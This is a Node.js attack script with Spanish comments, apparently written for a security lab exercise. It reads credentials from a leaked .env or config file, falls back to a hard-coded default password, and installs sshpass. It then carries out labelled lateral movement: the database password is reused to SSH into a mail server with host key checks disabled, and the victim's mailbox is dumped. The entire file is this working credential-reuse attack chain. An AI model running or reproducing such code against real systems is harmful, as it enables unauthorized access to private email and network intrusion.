const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

console.log("=== Paso 1: Leyendo credenciales e infraestructura de .env filtrado ===");
const candidateEnvPaths = [
    path.join(__dirname, 'src', '.env'),
    path.join(__dirname, '..', 'src', '.env'),
    path.join(__dirname, '.env'),
    '/var/www/html/src/.env'
];
const envPath = candidateEnvPaths.find(p => fs.existsSync(p));

const env = {};

if (envPath) {
    console.log(`[INFO] Usando archivo .env en: ${envPath}`);
    const envContent = fs.readFileSync(envPath, 'utf8');
    envContent.split('\n').forEach(line => {
        const parts = line.split('=');
        if (parts.length === 2) {
            env[parts[0].trim()] = parts[1].trim();
        }
    });
} else {
    const candidateConfigPaths = [
        path.join(__dirname, 'src', 'config.json'),
        path.join(__dirname, '..', 'src', 'config.json'),
        '/var/www/html/src/config.json'
    ];
    const configPath = candidateConfigPaths.find(p => fs.existsSync(p));
    if (configPath) {
        console.log(`[INFO] Usando archivo config.json en: ${configPath}`);
        const configData = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        env['MAIL_USER'] = configData.MAIL_USER || 'mailadmin';
        env['MAIL_HOST'] = configData.MAIL_HOST || 'mail-server';
        env['DB_PASSWORD'] = configData.DB_PASSWORD || 'cinvestav123';
    } else {
        console.log(`[WARN] Usando credenciales por defecto.`);
        env['MAIL_USER'] = 'mailadmin';
        env['MAIL_HOST'] = 'mail-server';
        env['DB_PASSWORD'] = 'cinvestav123';
    }
}

const mailUser = env['MAIL_USER'];
const mailHost = env['MAIL_HOST'];
const dbPassword = env['DB_PASSWORD'];

console.log(`[INFO] Objetivo detectado: ${mailUser}@${mailHost}`);
console.log(`[INFO] Contraseña recuperada: ${dbPassword}\n`);

console.log("=== Paso 2: Verificando / Instalando herramientas necesarias (SSH & sshpass) ===");
try {
    // Verificar si sshpass ya está instalado antes de intentar instalarlo
    try {
        execSync('which sshpass');
        console.log("[OK] sshpass ya está instalado.");
    } catch (checkErr) {
        // Ejecutar apt-get de forma limpia sin desbordar el buffer de execSync
        execSync('apt-get update -y && apt-get install -y sshpass openssh-client', { maxBuffer: 1024 * 1024 * 10 });
        console.log("[OK] Herramientas instaladas con éxito.\n");
    }
} catch (e) {
    console.log("[ERROR] No se pudo instalar:", e.message);
}

console.log("=== Paso 3: Ejecutando Movimiento Lateral por SSH y Recuperando Correos ===");
try {
    // Probar primero puerto 22, y fallback a puerto 2222
    let cmd = `sshpass -p "${dbPassword}" ssh -o StrictHostKeyChecking=no ${mailUser}@${mailHost} "cat /var/mail/${mailUser} 2>/dev/null || cat /var/spool/mail/${mailUser}"`;
    let output;
    try {
        output = execSync(cmd).toString();
    } catch (err22) {
        cmd = `sshpass -p "${dbPassword}" ssh -p 2222 -o StrictHostKeyChecking=no ${mailUser}@${mailHost} "cat /var/mail/${mailUser} 2>/dev/null || cat /var/spool/mail/${mailUser}"`;
        output = execSync(cmd).toString();
    }

    console.log("[CONEXIÓN EXITOSA] Correos recuperados de /var/mail/" + mailUser + ":\n");
    console.log("------------------------------------------------------------------");
    console.log(output);
    console.log("------------------------------------------------------------------");
} catch (e) {
    console.log("[ERROR de Conexión]:", e.message);
}
